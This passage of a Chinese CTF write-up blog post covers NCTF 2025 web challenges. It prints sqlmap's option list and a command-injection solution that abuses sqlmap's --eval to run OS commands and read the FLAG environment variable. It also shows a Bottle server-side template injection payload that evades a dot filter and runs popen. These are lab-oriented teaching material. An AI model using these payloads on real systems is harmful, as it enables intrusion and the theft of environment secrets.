+</span></span><span class="line"><span class="cl">    -C COL              DBMS database table column(s) to enumerate
+</span></span><span class="line"><span class="cl">    -X EXCLUDE          DBMS database identifier(s) to not enumerate
+</span></span><span class="line"><span class="cl">    -U USER             DBMS user to enumerate
+</span></span><span class="line"><span class="cl">    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
+</span></span><span class="line"><span class="cl">    --pivot-column=P..  Pivot column name
+</span></span><span class="line"><span class="cl">    --where=DUMPWHERE   Use WHERE condition while table dumping
+</span></span><span class="line"><span class="cl">    --start=LIMITSTART  First dump table entry to retrieve
+</span></span><span class="line"><span class="cl">    --stop=LIMITSTOP    Last dump table entry to retrieve
+</span></span><span class="line"><span class="cl">    --first=FIRSTCHAR   First query output word character to retrieve
+</span></span><span class="line"><span class="cl">    --last=LASTCHAR     Last query output word character to retrieve
+</span></span><span class="line"><span class="cl">    --sql-query=SQLQ..  SQL statement to be executed
+</span></span><span class="line"><span class="cl">    --sql-shell         Prompt for an interactive SQL shell
+</span></span><span class="line"><span class="cl">    --sql-file=SQLFILE  Execute SQL statements from given file(s)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Brute force:
+</span></span><span class="line"><span class="cl">    These options can be used to run brute force checks
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    --common-tables     Check existence of common tables
+</span></span><span class="line"><span class="cl">    --common-columns    Check existence of common columns
+</span></span><span class="line"><span class="cl">    --common-files      Check existence of common files
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  User-defined function injection:
+</span></span><span class="line"><span class="cl">    These options can be used to create custom user-defined functions
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    --udf-inject        Inject custom user-defined functions
+</span></span><span class="line"><span class="cl">    --shared-lib=SHLIB  Local path of the shared library
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  File system access:
+</span></span><span class="line"><span class="cl">    These options can be used to access the back-end database management
+</span></span><span class="line"><span class="cl">    system underlying file system
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    --file-read=FILE..  Read a file from the back-end DBMS file system
+</span></span><span class="line"><span class="cl">    --file-write=FIL..  Write a local file on the back-end DBMS file system
+</span></span><span class="line"><span class="cl">    --file-dest=FILE..  Back-end DBMS absolute filepath to write to
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Operating system access:
+</span></span><span class="line"><span class="cl">    These options can be used to access the back-end database management
+</span></span><span class="line"><span class="cl">    system underlying operating system
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    --os-cmd=OSCMD      Execute an operating system command
+</span></span><span class="line"><span class="cl">    --os-shell          Prompt for an interactive operating system shell
+</span></span><span class="line"><span class="cl">    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
+</span></span><span class="line"><span class="cl">    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC
+</span></span><span class="line"><span class="cl">    --os-bof            Stored procedure buffer overflow exploitation
+</span></span><span class="line"><span class="cl">    --priv-esc          Database process user privilege escalation
+</span></span><span class="line"><span class="cl">    --msf-path=MSFPATH  Local path where Metasploit Framework is installed
+</span></span><span class="line"><span class="cl">    --tmp-path=TMPPATH  Remote absolute path of temporary files directory
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Windows registry access:
+</span></span><span class="line"><span class="cl">    These options can be used to access the back-end database management
+</span></span><span class="line"><span class="cl">    system Windows registry
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    --reg-read          Read a Windows registry key value
+</span></span><span class="line"><span class="cl">    --reg-add           Write a Windows registry key value data
+</span></span><span class="line"><span class="cl">    --reg-del           Delete a Windows registry key value
+</span></span><span class="line"><span class="cl">    --reg-key=REGKEY    Windows registry key
+</span></span><span class="line"><span class="cl">    --reg-value=REGVAL  Windows registry key value
+</span></span><span class="line"><span class="cl">    --reg-data=REGDATA  Windows registry key value data
+</span></span><span class="line"><span class="cl">    --reg-type=REGTYPE  Windows registry key value type
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  General:
+</span></span><span class="line"><span class="cl">    These options can be used to set some general working parameters
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    -s SESSIONFILE      Load session from a stored (.sqlite) file
+</span></span><span class="line"><span class="cl">    -t TRAFFICFILE      Log all HTTP traffic into a textual file
+</span></span><span class="line"><span class="cl">    --answers=ANSWERS   Set predefined answers (e.g. &#34;quit=N,follow=N&#34;)
+</span></span><span class="line"><span class="cl">    --base64=BASE64P..  Parameter(s) containing Base64 encoded data
+</span></span><span class="line"><span class="cl">    --base64-safe       Use URL and filename safe Base64 alphabet (RFC 4648)
+</span></span><span class="line"><span class="cl">    --batch             Never ask for user input, use the default behavior
+</span></span><span class="line"><span class="cl">    --binary-fields=..  Result fields having binary values (e.g. &#34;digest&#34;)
+</span></span><span class="line"><span class="cl">    --check-internet    Check Internet connection before assessing the target
+</span></span><span class="line"><span class="cl">    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables
+</span></span><span class="line"><span class="cl">    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL
+</span></span><span class="line"><span class="cl">    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. &#34;logout&#34;)
+</span></span><span class="line"><span class="cl">    --csv-del=CSVDEL    Delimiting character used in CSV output (default &#34;,&#34;)
+</span></span><span class="line"><span class="cl">    --charset=CHARSET   Blind SQL injection charset (e.g. &#34;0123456789abcdef&#34;)
+</span></span><span class="line"><span class="cl">    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)
+</span></span><span class="line"><span class="cl">    --encoding=ENCOD..  Character encoding used for data retrieval (e.g. GBK)
+</span></span><span class="line"><span class="cl">    --eta               Display for each output the estimated time of arrival
+</span></span><span class="line"><span class="cl">    --flush-session     Flush session files for current target
+</span></span><span class="line"><span class="cl">    --forms             Parse and test forms on target URL
+</span></span><span class="line"><span class="cl">    --fresh-queries     Ignore query results stored in session file
+</span></span><span class="line"><span class="cl">    --gpage=GOOGLEPAGE  Use Google dork results from specified page number
+</span></span><span class="line"><span class="cl">    --har=HARFILE       Log all HTTP traffic into a HAR file
+</span></span><span class="line"><span class="cl">    --hex               Use hex conversion during data retrieval
+</span></span><span class="line"><span class="cl">    --output-dir=OUT..  Custom output directory path
+</span></span><span class="line"><span class="cl">    --parse-errors      Parse and display DBMS error messages from responses
+</span></span><span class="line"><span class="cl">    --preprocess=PRE..  Use given script(s) for preprocessing (request)
+</span></span><span class="line"><span class="cl">    --postprocess=PO..  Use given script(s) for postprocessing (response)
+</span></span><span class="line"><span class="cl">    --repair            Redump entries having unknown character marker (?)
+</span></span><span class="line"><span class="cl">    --save=SAVECONFIG   Save options to a configuration INI file
+</span></span><span class="line"><span class="cl">    --scope=SCOPE       Regexp for filtering targets
+</span></span><span class="line"><span class="cl">    --skip-heuristics   Skip heuristic detection of SQLi/XSS vulnerabilities
+</span></span><span class="line"><span class="cl">    --skip-waf          Skip heuristic detection of WAF/IPS protection
+</span></span><span class="line"><span class="cl">    --table-prefix=T..  Prefix used for temporary tables (default: &#34;sqlmap&#34;)
+</span></span><span class="line"><span class="cl">    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
+</span></span><span class="line"><span class="cl">    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)
+</span></span><span class="line"><span class="cl">    --web-root=WEBROOT  Web server document root directory (e.g. &#34;/var/www&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Miscellaneous:
+</span></span><span class="line"><span class="cl">    These options do not fit into any other category
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    -z MNEMONICS        Use short mnemonics (e.g. &#34;flu,bat,ban,tec=EU&#34;)
+</span></span><span class="line"><span class="cl">    --alert=ALERT       Run host OS command(s) when SQL injection is found
+</span></span><span class="line"><span class="cl">    --beep              Beep on question and/or when SQLi/XSS/FI is found
+</span></span><span class="line"><span class="cl">    --dependencies      Check for missing (optional) sqlmap dependencies
+</span></span><span class="line"><span class="cl">    --disable-coloring  Disable console output coloring
+</span></span><span class="line"><span class="cl">    --list-tampers      Display list of available tamper scripts
+</span></span><span class="line"><span class="cl">    --offline           Work in offline mode (only use session data)
+</span></span><span class="line"><span class="cl">    --purge             Safely remove all content from sqlmap data directory
+</span></span><span class="line"><span class="cl">    --results-file=R..  Location of CSV results file in multiple targets mode
+</span></span><span class="line"><span class="cl">    --shell             Prompt for an interactive sqlmap shell
+</span></span><span class="line"><span class="cl">    --tmp-dir=TMPDIR    Local directory for storing temporary files
+</span></span><span class="line"><span class="cl">    --unstable          Adjust options for unstable connections
+</span></span><span class="line"><span class="cl">    --update            Update sqlmap
+</span></span><span class="line"><span class="cl">    --wizard            Simple wizard interface for beginner users</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>看到这两个</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">--eval=EVALCODE     Evaluate provided Python code before the request (e.g.
+</span></span><span class="line"><span class="cl">                    &#34;import hashlib;id2=hashlib.md5(id).hexdigest()&#34;)
+</span></span><span class="line"><span class="cl">-c CONFIGFILE       Load options from a configuration INI file</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><code>--eval</code> 能够运行 <code>python</code> 代码，执行系统命令，写入文件并用 <code>-c</code> 读取文件内容，<code>-c</code> 的内容会回显在 <code>sqlmap</code> 的执行结果中</p>
+<p>将内容写入 <code>sql1</code> 中</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">sqlmap -u `127.0.0.1 --eval eval(&#34;__import__(&#39;os&#39;).system(&#39;ls$IFS-m$IFS/&gt;&gt;sql1&#39;)&#34;)` --batch --flush-session</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250322204535836.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>读取</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">sqlmap -u `127.0.0.1 -c sql1` --batch --flush-session</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>读取成功，但 flag 不在根目录</p>
+<p><figure>
+  <img src="file-20250322204612747.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>NCTF 题目的所有 FLAG 都存储在环境变量 FLAG 中
+<figure>
+  <img src="file-20250322205722316.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>直接读取 FLAG 环境变量，得到 flag</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">127.0.0.1 --eval eval(&#34;__import__(&#39;os&#39;).system(&#39;echo$IFS$FLAG&gt;&gt;sql2&#39;)&#34;)
+</span></span><span class="line"><span class="cl">127.0.0.1 -c sql2</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250322205603202.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="ez_dash复现"><span>ez_dash(复现)</span>
+  <a href="#ez_dash%e5%a4%8d%e7%8e%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><figure>
+  <img src="image-20250324104717928.png" alt="image-20250324104717928" loading="lazy"></figure>
+</p>
+<p>源码</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">#source.txt
+</span></span><span class="line"><span class="cl">from typing import Optional
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">import pydash
+</span></span><span class="line"><span class="cl">import bottle
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">__forbidden_path__=[&#39;__annotations__&#39;, &#39;__call__&#39;, &#39;__class__&#39;, &#39;__closure__&#39;,
+</span></span><span class="line"><span class="cl">               &#39;__code__&#39;, &#39;__defaults__&#39;, &#39;__delattr__&#39;, &#39;__dict__&#39;,
+</span></span><span class="line"><span class="cl">               &#39;__dir__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;,
+</span></span><span class="line"><span class="cl">               &#39;__ge__&#39;, &#39;__get__&#39;, &#39;__getattribute__&#39;,
+</span></span><span class="line"><span class="cl">               &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__init_subclass__&#39;,
+</span></span><span class="line"><span class="cl">               &#39;__kwdefaults__&#39;, &#39;__le__&#39;, &#39;__lt__&#39;, &#39;__module__&#39;,
+</span></span><span class="line"><span class="cl">               &#39;__name__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__qualname__&#39;,
+</span></span><span class="line"><span class="cl">               &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;,
+</span></span><span class="line"><span class="cl">               &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;__wrapped__&#39;,
+</span></span><span class="line"><span class="cl">               &#34;Optional&#34;,&#34;func&#34;,&#34;render&#34;,
+</span></span><span class="line"><span class="cl">               ]
+</span></span><span class="line"><span class="cl">__forbidden_name__=[
+</span></span><span class="line"><span class="cl">    &#34;bottle&#34;
+</span></span><span class="line"><span class="cl">]
+</span></span><span class="line"><span class="cl">__forbidden_name__.extend(dir(globals()[&#34;__builtins__&#34;]))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def setval(name:str, path:str, value:str)-&gt; Optional[bool]:
+</span></span><span class="line"><span class="cl">    if name.find(&#34;__&#34;)&gt;=0: return False
+</span></span><span class="line"><span class="cl">    for word in __forbidden_name__:
+</span></span><span class="line"><span class="cl">        if name == word:
+</span></span><span class="line"><span class="cl">            return False
+</span></span><span class="line"><span class="cl">    for word in __forbidden_path__:
+</span></span><span class="line"><span class="cl">        if path.find(word)&gt;=0: return False
+</span></span><span class="line"><span class="cl">    obj = globals()[name]
+</span></span><span class="line"><span class="cl">    try:
+</span></span><span class="line"><span class="cl">        pydash.set_(obj,path,value)
+</span></span><span class="line"><span class="cl">    except:
+</span></span><span class="line"><span class="cl">        return False
+</span></span><span class="line"><span class="cl">    return True
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@bottle.post(&#39;/setValue&#39;)
+</span></span><span class="line"><span class="cl">def set_value():
+</span></span><span class="line"><span class="cl">    name = bottle.request.query.get(&#39;name&#39;)
+</span></span><span class="line"><span class="cl">    path = bottle.request.json.get(&#39;path&#39;)
+</span></span><span class="line"><span class="cl">    if not isinstance(path,str):
+</span></span><span class="line"><span class="cl">        return &#34;no&#34;
+</span></span><span class="line"><span class="cl">    if len(name)&gt;6 or len(path)&gt;32:
+</span></span><span class="line"><span class="cl">        return &#34;no&#34;
+</span></span><span class="line"><span class="cl">    value = bottle.request.json.get(&#39;value&#39;)
+</span></span><span class="line"><span class="cl">    return &#34;yes&#34; if setval(name, path, value) else &#34;no&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@bottle.get(&#39;/render&#39;)
+</span></span><span class="line"><span class="cl">def render_template():
+</span></span><span class="line"><span class="cl">    path = bottle.request.query.get(&#39;path&#39;)
+</span></span><span class="line"><span class="cl">    if path.find(&#34;{&#34;) &gt;= 0 or path.find(&#34;}&#34;) &gt;= 0 or path.find(&#34;.&#34;)&gt;=0:
+</span></span><span class="line"><span class="cl">        return &#34;Hacker&#34;
+</span></span><span class="line"><span class="cl">    return bottle.template(path)
+</span></span><span class="line"><span class="cl">bottle.run(host = &#39;0.0.0.0&#39;, port = 8000)</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>我们翻看 <code>Bottle</code>文档模板引擎部分，能很轻易的发现模板注入</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">return bottle.template(path)</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250411091726233.png" alt="" loading="lazy"></figure>
+</p>
+<p>尽管程序过滤了<code>.{}</code>，但<code>Bottle</code>模板引擎还支持 <code>%</code>的写法，能解析<code>Python</code>代码
+<figure>
+  <img src="file-20250411091828512.png" alt="" loading="lazy"></figure>
+</p>
+<p>所以思路是直接模板注入，不用管 <code>_set</code>，题目过滤了<code>.</code> 我们可以通过编码绕过</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">if path.find(&#34;{&#34;) &gt;= 0 or path.find(&#34;}&#34;) &gt;= 0 or path.find(&#34;.&#34;)&gt;=0:
+</span></span><span class="line"><span class="cl">	return &#34;Hacker&#34;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>命令执行<code>Payload</code> 如下，发包时记得进行一层URL编码</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/render?path=% eval(&#34;__import__(&#39;os&#39;)&#34;+chr(46)+&#34;popen(&#39;env&gt;a&#39;)&#34;)
+</span></span><span class="line"><span class="cl">/render?path=a</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250412100915572.png" alt="" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="ez_dash_revenge复现"><span>ez_dash_revenge(复现)</span>
+  <a href="#ez_dash_revenge%e5%a4%8d%e7%8e%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><figure>
+  <img src="image-20250324104733615.png" alt="image-20250324104733615" loading="lazy"></figure>
+</p>
+<p>已复现</p>
+<p>详细请看 - 初识原型链污染篇章：</p>
+<p><a href="https://oct1sec.top/2025/04/10/%E5%88%9D%E8%AF%86Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" target="_blank" rel="external nofollow noopener noreferrer">https://oct1sec.top/2025/04/10/%E5%88%9D%E8%AF%86Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p>
+<h1 class="heading-element" id="h2-revenge暂未复现"><span>H2 Revenge(暂未复现)</span>
+  <a href="#h2-revenge%e6%9a%82%e6%9c%aa%e5%a4%8d%e7%8e%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><figure>
+  <img src="file-20250323105239086.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="internal_api暂未复现"><span>internal_api(暂未复现)</span>
+  <a href="#internal_api%e6%9a%82%e6%9c%aa%e5%a4%8d%e7%8e%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><figure>
+  <img src="file-20250323105253117.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+</div><div id="comments"><div id="giscus" class="comment">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="L1nq0/L1nq0.github.io"
+            data-repo-id="R_kgDOSLdcIg"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOSLdcIs4DA03P"
+            data-mapping="pathname"
+            data-strict="0"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div><div class="post-footer" id="post-footer"><ul class="post-footer-tags"><li class="post-footer-tag-item">
+          <a href="/tags/ctf/" class="post-footer-tag-link" title="Tags - CTF">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-tag-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9l14 0"/><path d="M5 15l14 0"/><path d="M11 4l-4 16"/><path d="M17 4l-4 16"/></svg>
+            <span>CTF</span>
+          </a>
+        </li></ul><div class="post-footer-share">
+    <span class="post-footer-share-label">Share this post on:</span>
+    <div class="post-footer-share-links"><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://sw1mblu3.fun/posts/nctf-2025%E6%98%A5%E5%AD%A3%E8%B5%9B/" data-title="NCTF 2025 Web Writeup&amp;Challenge Walkthrough" data-via="map[icon:map[angellist: bandcamp: behance: bilibili: bitbucket: bluesky: buymeacoffee: class:fa-brands fa-x-twitter codepen: credly: csdn: deviantart: devto: diaspora: discord: discordinvite: douban: douyin: dribbble: facebook: feishu: fivehundredpx: flickr: foursquare: freecodecamp: gitea: gitlab: goodreads: googlescholar: hackernews: hackthebox: instagram: jsfiddle: kaggle: keybase: kickstarter: ko-fi: lastfm: liberapay: lichess: linktree: mastodon: matrix: mediawiki: medium: mix: odnoklassniki: orcid: patreon: paypal: phone: pinterest: pleroma: plume: qq: qqgroup: quora: reddit: researchgate: rootme: skype: slidershare: snapchat: soundcloud: spotify: stackoverflow: steam: strava: telegram: thingiverse: tiktok: tryhackme: tumblr: twitch: vine: vk: weibo: whatsapp: wordpress: xing: xmpp: youtubechannel: youtubecustom: youtubelegacy: zhihu:] id:L1nq1_ prefix:https://x.com/ title:X weight:2]" data-hashtags="CTF"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://sw1mblu3.fun/posts/nctf-2025%E6%98%A5%E5%AD%A3%E8%B5%9B/" data-hashtag="CTF"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://sw1mblu3.fun/posts/nctf-2025%E6%98%A5%E5%AD%A3%E8%B5%9B/" data-title="NCTF 2025 Web Writeup&amp;Challenge Walkthrough"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </div>
+  </div><hr class="post-footer-divider">
+    <div class="post-footer-nav"><a href="/posts/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/" class="post-footer-nav-prev" rel="prev">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 6l-6 6l6 6"/></svg>
+          <div>
+            <span class="post-footer-nav-label">Previous Post</span>
+            <div class="post-footer-nav-title">强网杯 2024 初赛 Web Challenge Walkthrough</div>
+          </div>
+        </a><a href="/posts/polarctf-2025%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/" class="post-footer-nav-next" rel="next">
+          <div>
+            <span class="post-footer-nav-label">Next Post</span>
+            <div class="post-footer-nav-title">PolarCTF 2025 春季个人赛 Web Writeup</div>
+          </div>
